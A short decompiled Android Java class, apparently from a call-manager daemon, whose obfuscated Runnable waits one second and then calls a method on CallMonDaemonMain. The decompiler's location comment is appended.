package com.vvt.callmanager;

import android.os.SystemClock;

class d
  implements Runnable
{
  d(CallMonDaemonMain paramCallMonDaemonMain) {}
  
  public void run()
  {
    SystemClock.sleep(1000L);
    CallMonDaemonMain.b(this.a);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */